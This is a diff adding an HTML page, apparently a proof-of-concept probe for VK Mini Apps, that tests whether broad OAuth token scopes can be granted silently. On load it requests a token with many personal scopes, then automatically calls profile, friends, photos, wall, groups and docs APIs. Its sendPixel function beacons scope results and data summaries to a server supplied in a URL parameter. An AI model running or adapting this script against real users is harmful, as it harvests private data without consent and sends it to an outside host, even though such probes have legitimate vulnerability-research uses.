@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Token Test</title>
+<script src="https://unpkg.com/@vkontakte/vk-bridge/dist/browser.min.js" defer></script>
+<style>
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f4f5;color:#000;min-height:100vh;padding:16px}
+.card{background:#fff;border-radius:14px;padding:20px;max-width:540px;margin:0 auto 14px;box-shadow:0 1px 3px rgba(0,0,0,.08)}
+h2{font-size:17px;font-weight:600;text-align:center;margin-bottom:4px}
+.sub{font-size:11px;color:#818c99;text-align:center;margin-bottom:14px;line-height:1.5}
+.pill{display:inline-block;font-size:10px;padding:2px 8px;border-radius:8px;font-weight:600;margin-left:6px;vertical-align:middle}
+.p-ok{background:#e3f8e9;color:#2eb851}.p-fail{background:#ffe4e4;color:#e64646}.p-wait{background:#eee;color:#818c99}
+.p-crit{background:#ff5252;color:#fff}.p-run{background:#e6f2ff;color:#0077ff}.p-bypass{background:#ff6f00;color:#fff}
+.p-warn{background:#fff3e0;color:#e65100}
+.row{display:flex;flex-direction:column;padding:8px 0;border-bottom:1px solid #f7f7f7}
+.rname{font-size:13px;color:#000;font-weight:500}
+.rdesc{font-size:10px;color:#818c99;margin-top:2px}
+.rval{font-size:11px;font-family:ui-monospace,monospace;color:#333;margin-top:4px;word-break:break-all}
+.section{font-size:14px;font-weight:600;color:#0077ff;margin:14px 0 6px;padding-top:10px;border-top:1px solid #f0f0f0}
+#log{background:#0d1117;border-radius:8px;padding:10px;font-family:ui-monospace,monospace;font-size:10px;color:#aaa;max-height:600px;overflow-y:auto;margin-top:12px}
+#log p{margin:2px 0;line-height:1.4}
+.l-ok{color:#4caf50}.l-warn{color:#ffa726}.l-err{color:#ef5350}.l-crit{color:#ff5252;font-weight:700}.l-info{color:#64b5f6}.l-bypass{color:#ff6f00;font-weight:700}
+.verdict{font-size:15px;font-weight:700;text-align:center;padding:14px;border-radius:10px;margin:12px 0}
+.v-crit{background:#fce4ec;color:#b71c1c;border:2px solid #ef5350}
+.v-ok{background:#e8f5e9;color:#2e7d32;border:2px solid #4caf50}
+.v-wait{background:#f5f5f5;color:#999;border:2px solid #ddd}
+.v-warn{background:#fff3e0;color:#e65100;border:2px solid #ff9800}
+.scope-grid{display:flex;flex-wrap:wrap;gap:4px;margin:6px 0}
+.scope-tag{font-size:10px;padding:3px 8px;border-radius:6px;font-weight:600}
+.st-granted{background:#e8f5e9;color:#2e7d32}.st-denied{background:#fce4ec;color:#c62828}.st-unknown{background:#f5f5f5;color:#999}
+.btn-row{display:flex;flex-wrap:wrap;gap:6px;margin:8px 0}
+.btn-row button{border:none;border-radius:8px;padding:10px 14px;font-size:11px;font-weight:600;cursor:pointer;background:#0077ff;color:#fff}
+.btn-row button.alt{background:#e64646}
+.btn-row button.sec{background:#4a76a8}
+.btn-row button:disabled{opacity:.4;cursor:default}
+.raw-box{background:#1a1a2e;border-radius:8px;padding:12px;font-family:ui-monospace,monospace;font-size:10px;color:#e0e0e0;margin-top:10px;white-space:pre-wrap;word-break:break-all;max-height:300px;overflow-y:auto;display:none}
+.api-result{background:#f8f9fa;border-radius:8px;padding:10px;margin:6px 0;font-size:11px;font-family:ui-monospace,monospace;word-break:break-all;max-height:150px;overflow-y:auto}
+</style>
+</head>
+<body>
+
+<div class="card">
+  <h2>VK Bridge — Token Scope Escalation Probe</h2>
+  <p class="sub">Phase 1: silent scope recon. Phase 2: token request (broad scopes). Phase 3: API data access test.<br>All results displayed on-page.</p>
+
+  <div class="verdict v-wait" id="verdict">Waiting for results...</div>
+
+  <div class="section">Phase 1 — Silent Scope Recon (CheckAllowedScopes)</div>
+  <div class="row">
+    <div class="rname">Pre-granted scopes <span class="pill p-wait" id="s-recon">WAIT</span></div>
+    <div class="rdesc">Checks which scopes are already authorized — completely silent, no prompt</div>
+    <div class="scope-grid" id="scope-grid"></div>
+  </div>
+
+  <div class="section">Phase 2 — Token Acquisition (GetAuthToken)</div>
+  <div class="row">
+    <div class="rname">Token request <span class="pill p-wait" id="s-token">WAIT</span></div>
+    <div class="rdesc">Requests token with ALL personal scopes. Key: did a consent dialog appear?</div>
+    <div class="rval" id="v-token">—</div>
+  </div>
+  <div class="row">
+    <div class="rname">Granted scopes <span class="pill p-wait" id="s-granted">WAIT</span></div>
+    <div class="rdesc">Which scopes came back on the token</div>
+    <div class="scope-grid" id="granted-grid"></div>
+  </div>
+  <div class="row">
+    <div class="rname">Timing analysis <span class="pill p-wait" id="s-timing">WAIT</span></div>
+    <div class="rdesc">&lt;500ms = likely silent (no dialog). &gt;1s = dialog probably shown</div>
+    <div class="rval" id="v-timing">—</div>
+  </div>
+
+  <div class="section">Phase 3 — API Data Dump (CallAPIMethod)</div>
+  <div class="row">
+    <div class="rname">account.getProfileInfo <span class="pill p-wait" id="s-api-account">WAIT</span></div>
+    <div class="rdesc">Full account info — phone, email, name, DOB</div>
+    <div class="api-result" id="v-api-account" style="display:none"></div>
+  </div>
+  <div class="row">
+    <div class="rname">friends.get <span class="pill p-wait" id="s-api-friends">WAIT</span></div>
+    <div class="rdesc">Full friends list with names</div>
+    <div class="api-result" id="v-api-friends" style="display:none"></div>
+  </div>
+  <div class="row">
+    <div class="rname">photos.getAll <span class="pill p-wait" id="s-api-photos">WAIT</span></div>
+    <div class="rdesc">All user photos — count + URLs</div>
+    <div class="api-result" id="v-api-photos" style="display:none"></div>
+  </div>
+  <div class="row">
+    <div class="rname">wall.get <span class="pill p-wait" id="s-api-wall">WAIT</span></div>
+    <div class="rdesc">Wall posts — private content</div>
+    <div class="api-result" id="v-api-wall" style="display:none"></div>
+  </div>
+  <div class="row">
+    <div class="rname">groups.get <span class="pill p-wait" id="s-api-groups">WAIT</span></div>
+    <div class="rdesc">User's groups / communities</div>
+    <div class="api-result" id="v-api-groups" style="display:none"></div>
+  </div>
+  <div class="row">
+    <div class="rname">docs.get <span class="pill p-wait" id="s-api-docs">WAIT</span></div>
+    <div class="rdesc">User's documents</div>
+    <div class="api-result" id="v-api-docs" style="display:none"></div>
+  </div>
+
+  <div class="section">Controls</div>
+  <div class="btn-row">
+    <button onclick="runPhase1()">Re-run Phase 1</button>
+    <button onclick="runPhase2()">Re-run Phase 2</button>
+    <button onclick="runPhase3()" id="btn-phase3" disabled>Run Phase 3</button>
+    <button class="alt" onclick="toggleRaw()">Raw JSON</button>
+    <button class="sec" onclick="copyEvidence()">Copy Evidence</button>
+  </div>
+
+  <div class="raw-box" id="rawbox"></div>
+  <div id="log"></div>
+</div>
+
+<script>
+var q = new URLSearchParams(location.search);
+var SRV = q.get('srv') || '';
+var APP_ID_NUM = parseInt(q.get('vk_app_id')) || 54753486;
+var APP_ID = q.get('vk_app_id') || String(APP_ID_NUM);
+var USER_ID = q.get('vk_user_id') || '(unknown)';
+
+var ALL_CHECK_SCOPES = ['notify','friends','photos','audio','video','stories','pages','menu','phone'];
+var ALL_AUTH_SCOPES = 'friends,photos,video,stories,pages,status,notes,wall,docs,groups,stats,market';
+
+var storedToken = null;
+var allResults = {};
+
+function ts(){ return new Date().toTimeString().slice(0,8); }
+function lg(msg, cls){
+  var d = document.getElementById('log');
+  var p = document.createElement('p');
+  if(cls) p.className = 'l-' + cls;
+  p.textContent = '[' + ts() + '] ' + msg;
+  d.appendChild(p); d.scrollTop = d.scrollHeight;
+}
+function pill(id, txt, cls){
+  var e = document.getElementById('s-' + id);
+  if(e){ e.textContent = txt; e.className = 'pill ' + cls; }
+}
+function setVal(id, txt){
+  var e = document.getElementById('v-' + id);
+  if(e) e.textContent = txt;
+}
+
+function sendPixel(type, data){
+  if(!SRV) return;
+  try{
+    var payload = encodeURIComponent(JSON.stringify(data).slice(0, 1800));
+    new Image().src = SRV + '/log?type=' + encodeURIComponent(type) + '&d=' + payload + '&_t=' + Date.now();
+  }catch(e){}
+}
+
+async function runPhase1(){
+  lg('=== PHASE 1: Silent Scope Recon (VKWebAppCheckAllowedScopes) ===', 'warn');
+  pill('recon', 'RUNNING', 'p-run');
+  var grid = document.getElementById('scope-grid');
+  grid.innerHTML = '';
+  var t0 = Date.now();
+  try{
+    var r = await vkBridge.send('VKWebAppCheckAllowedScopes', {scopes: ALL_CHECK_SCOPES.join(',')});
+    var ms = Date.now() - t0;
+    var granted = [], denied = [], results = r.result || [];
+    for(var i = 0; i < results.length; i++){
+      var s = results[i];
+      var tag = document.createElement('span');
+      tag.className = 'scope-tag ' + (s.allowed ? 'st-granted' : 'st-denied');
+      tag.textContent = s.scope + (s.allowed ? ' GRANTED' : ' denied');
+      grid.appendChild(tag);
+      if(s.allowed) granted.push(s.scope); else denied.push(s.scope);
+    }
+    allResults.phase1 = {elapsed_ms: ms, granted: granted, denied: denied, raw: r};
+    lg('CheckAllowedScopes (' + ms + 'ms): ' + granted.length + ' granted, ' + denied.length + ' denied', granted.length > 0 ? 'crit' : 'ok');
+    lg('Granted: ' + (granted.length ? granted.join(', ') : '(none)'), granted.length ? 'crit' : 'ok');
+    pill('recon', granted.length + ' GRANTED (' + ms + 'ms)', granted.length > 0 ? 'p-crit' : 'p-ok');
+    sendPixel('SCOPE_RECON_HIT', {elapsed_ms: ms, granted: granted, denied: denied});
+  }catch(e){
+    var ms2 = Date.now() - t0;
+    var err = typeof e === 'object' ? JSON.stringify(e).slice(0,300) : String(e);
+    lg('CheckAllowedScopes FAILED (' + ms2 + 'ms): ' + err, 'err');
+    pill('recon', 'FAILED', 'p-fail');
+    allResults.phase1 = {elapsed_ms: ms2, error: err};
+  }
+}
+
+async function runPhase2(){
+  lg('=== PHASE 2: Token Acquisition (VKWebAppGetAuthToken) ===', 'warn');
+  lg('Requesting scopes: ' + ALL_AUTH_SCOPES, 'warn');
+  pill('token', 'REQUESTING...', 'p-run');
+  var t0 = Date.now();
+  try{
+    var r = await vkBridge.send('VKWebAppGetAuthToken', {app_id: APP_ID_NUM, scope: ALL_AUTH_SCOPES});
+    var ms = Date.now() - t0;
+    storedToken = r.access_token;
+    var grantedScope = r.scope || '(empty)';
+    var grantedList = grantedScope ? grantedScope.split(',') : [];
+    var tokenPreview = storedToken ? storedToken.slice(0, 12) + '...' + storedToken.slice(-6) : '(none)';
+    setVal('token', 'Token: ' + tokenPreview + ' | expires: ' + (r.expires || 'not set'));
+
+    var silent = ms < 500;
+    var timingVerdict = ms + 'ms — ' + (silent ? 'SILENT (no dialog — scopes granted without consent)' : ms < 1500 ? 'FAST (possible auto-grant)' : 'Dialog likely shown');
+    setVal('timing', timingVerdict);
+    pill('timing', silent ? 'SILENT ' + ms + 'ms' : ms + 'ms', silent ? 'p-bypass' : ms < 1500 ? 'p-warn' : 'p-ok');
+
+    var gGrid = document.getElementById('granted-grid');
+    gGrid.innerHTML = '';
+    var requested = ALL_AUTH_SCOPES.split(',');
+    for(var i = 0; i < requested.length; i++){
+      var tag = document.createElement('span');
+      var isGranted = grantedList.indexOf(requested[i]) !== -1;
+      tag.className = 'scope-tag ' + (isGranted ? 'st-granted' : 'st-denied');
+      tag.textContent = requested[i] + (isGranted ? ' GRANTED' : ' denied');
+      gGrid.appendChild(tag);
+    }
+
+    pill('token', 'TOKEN OBTAINED ' + ms + 'ms', 'p-crit');
+    pill('granted', grantedList.length + '/' + requested.length + ' scopes', grantedList.length > 3 ? 'p-crit' : 'p-warn');
+    lg('TOKEN OBTAINED in ' + ms + 'ms — scopes: ' + grantedScope, 'crit');
+
+    allResults.phase2 = {elapsed_ms: ms, token_obtained: true, token_preview: tokenPreview, granted_scopes: grantedList, silent: silent, timing_verdict: timingVerdict};
+    sendPixel('TOKEN_HIT', {elapsed_ms: ms, scopes: grantedScope, silent: silent, token_len: storedToken ? storedToken.length : 0});
+
+    document.getElementById('btn-phase3').disabled = false;
+
+    if(silent && grantedList.length > 2){
+      document.getElementById('verdict').textContent = 'CRITICAL — Token with ' + grantedList.length + ' scopes granted SILENTLY in ' + ms + 'ms';
+      document.getElementById('verdict').className = 'verdict v-crit';
+    } else if(grantedList.length > 0){
+      document.getElementById('verdict').textContent = 'Token obtained — ' + grantedList.length + ' scopes (' + ms + 'ms). Running API tests...';
+      document.getElementById('verdict').className = 'verdict v-warn';
+    }
+
+    lg('Auto-launching Phase 3...', 'warn');
+    await runPhase3();
+
+  }catch(e){
+    var ms2 = Date.now() - t0;
+    var err = typeof e === 'object' ? JSON.stringify(e).slice(0,300) : String(e);
+    var errObj = typeof e === 'object' ? e : {};
+    var errCode = errObj.error_data ? errObj.error_data.error_code : (errObj.error_code || '?');
+    lg('GetAuthToken FAILED (' + ms2 + 'ms): code=' + errCode + ' ' + err, 'err');
+    pill('token', 'DENIED (code ' + errCode + ')', 'p-fail');
+    if(errCode == 4){ setVal('token', 'User denied dialog (' + ms2 + 'ms)'); pill('timing', ms2 + 'ms (denied)', 'p-ok'); }
+    else setVal('token', 'Error: ' + err);
+    allResults.phase2 = {elapsed_ms: ms2, token_obtained: false, error: err, error_code: errCode};
+  }
+}
+
+async function runPhase3(){
+  if(!storedToken){ lg('Phase 3 skipped — no token', 'err'); return; }
+  lg('=== PHASE 3: API Data Dump ===', 'warn');
+
+  var apis = [
+    {id:'account', method:'account.getProfileInfo', params:{}, extract:function(r){
+      var i=[]; if(r.phone) i.push('phone='+r.phone); if(r.bdate) i.push('bdate='+r.bdate);
+      if(r.first_name) i.push('name='+r.first_name+' '+r.last_name);
+      if(r.home_town) i.push('town='+r.home_town); if(r.screen_name) i.push('screen='+r.screen_name);
+      return i.length ? i.join(' | ') : JSON.stringify(r).slice(0,200);
+    }},
+    {id:'friends', method:'friends.get', params:{count:10,fields:'first_name,last_name,city,online'}, extract:function(r){
+      var c=r.count||0, items=r.items||[], n=[];
+      for(var i=0;i<Math.min(items.length,5);i++){var f=items[i]; n.push((f.first_name||'')+' '+(f.last_name||''));}
+      return 'Total: '+c+' | Sample: '+n.join(', ');
+    }},
+    {id:'photos', method:'photos.getAll', params:{count:5,photo_sizes:0}, extract:function(r){
+      var c=r.count||0, items=r.items||[], u=[];
+      for(var i=0;i<Math.min(items.length,3);i++){var s=items[i].sizes||[]; if(s.length) u.push(s[s.length-1].url);}
+      return 'Total: '+c+(u.length?' | URLs: '+u.join(', ').slice(0,200):'');
+    }},
+    {id:'wall', method:'wall.get', params:{count:3}, extract:function(r){
+      var c=r.count||0, items=r.items||[], p=[];
+      for(var i=0;i<Math.min(items.length,2);i++) p.push((items[i].text||'(no text)').slice(0,80));
+      return 'Total: '+c+' | Latest: '+p.join(' /// ');
+    }},
+    {id:'groups', method:'groups.get', params:{count:10,extended:1}, extract:function(r){
+      var c=r.count||0, items=r.items||[], n=[];
+      for(var i=0;i<Math.min(items.length,5);i++) n.push(items[i].name||items[i].id);
+      return 'Total: '+c+' | '+n.join(', ');
+    }},
+    {id:'docs', method:'docs.get', params:{count:5}, extract:function(r){
+      var c=r.count||0, items=r.items||[], n=[];
+      for(var i=0;i<Math.min(items.length,3);i++) n.push(items[i].title||'(untitled)');
+      return 'Total: '+c+(n.length?' | '+n.join(', '):'');
+    }}
+  ];
+
+  var hits=0; allResults.phase3={};
+  for(var i=0;i<apis.length;i++){
+    var a=apis[i]; pill('api-'+a.id,'CALLING...','p-run'); var t0=Date.now();
+    try{
+      var r=await vkBridge.send('VKWebAppCallAPIMethod',{method:a.method,params:Object.assign({},a.params,{access_token:storedToken,v:'5.199'})});
+      var ms=Date.now()-t0, resp=r.response||r, summary=a.extract(resp);
+      pill('api-'+a.id,'HIT '+ms+'ms','p-crit');
+      var el=document.getElementById('v-api-'+a.id); el.style.display='block'; el.textContent=summary;
+      lg(a.method+' ('+ms+'ms): '+summary,'crit'); hits++;
+      allResults.phase3[a.method]={elapsed_ms:ms,success:true,summary:summary,raw:JSON.stringify(resp).slice(0,1000)};
+      sendPixel('API_'+a.id.toUpperCase(),{method:a.method,ms:ms,summary:summary.slice(0,200)});
+    }catch(e){
+      var ms2=Date.now()-t0, err=typeof e==='object'?JSON.stringify(e).slice(0,300):String(e);
+      var eo=typeof e==='object'?e:{}, ec=eo.error_data?eo.error_data.error_code:(eo.error_code||'?');
+      pill('api-'+a.id,'ERR '+ec,'p-fail');
+      var el2=document.getElementById('v-api-'+a.id); el2.style.display='block'; el2.textContent='Error '+ec+': '+err;
+      lg(a.method+' FAILED ('+ms2+'ms): code='+ec,'err');
+      allResults.phase3[a.method]={elapsed_ms:ms2,success:false,error_code:ec,error:err};
+    }
+  }
+
+  lg('Phase 3: '+hits+'/'+apis.length+' API calls succeeded',hits>0?'crit':'warn');
+  var v=document.getElementById('verdict');
+  if(hits>3){v.textContent='CRITICAL — '+hits+'/'+apis.length+' API methods returned user data';v.className='verdict v-crit';}
+  else if(hits>0){v.textContent='PARTIAL — '+hits+'/'+apis.length+' API methods returned data';v.className='verdict v-warn';}
+  else if(storedToken){v.textContent='Token obtained but API calls blocked';v.className='verdict v-warn';}
+}
+
+function toggleRaw(){
+  var b=document.getElementById('rawbox');
+  if(b.style.display==='block')b.style.display='none';
+  else{b.textContent=JSON.stringify(allResults,null,2);b.style.display='block';}
+}
+function copyEvidence(){
+  var e='=== VK Token Scope Escalation Test ===\n';
+  e+='Timestamp: '+new Date().toISOString()+'\nApp ID: '+APP_ID+'\nUser ID: '+USER_ID+'\n';
+  e+='URL: '+location.href+'\nUA: '+navigator.userAgent+'\n\n';
+  e+=JSON.stringify(allResults,null,2);
+  try{navigator.clipboard.writeText(e).then(function(){lg('Copied!','ok')}).catch(function(){fbC(e)});}catch(x){fbC(e);}
+}
+function fbC(t){var a=document.createElement('textarea');a.value=t;a.style.cssText='position:fixed;left:-9999px';document.body.appendChild(a);a.select();try{document.execCommand('copy');lg('Copied!','ok');}catch(e){lg('Copy failed — use Raw JSON','err');}document.body.removeChild(a);}
+
+async function boot(){
+  allResults={test:'VK_TOKEN_SCOPE_ESCALATION',started:new Date().toISOString(),app_id:APP_ID,user_id:USER_ID,ua:navigator.userAgent,href:location.href};
+  for(var i=0;i<30&&!window.vkBridge;i++) await new Promise(function(r){setTimeout(r,150);});
+  if(!window.vkBridge){lg('vkBridge not loaded','err');document.getElementById('verdict').textContent='ERROR: Not in VK Mini App context';return;}
+  try{await vkBridge.send('VKWebAppInit');lg('VKWebAppInit OK — app='+APP_ID+' user='+USER_ID,'ok');}catch(e){lg('Init failed','err');}
+  await runPhase1();
+  await runPhase2();
+  allResults.completed=new Date().toISOString();
+  lg('=== ALL PHASES COMPLETE ===','warn');
+  lg('Use Copy Evidence to capture results','info');
+}
+boot();
+</script>
+</body>
+</html>
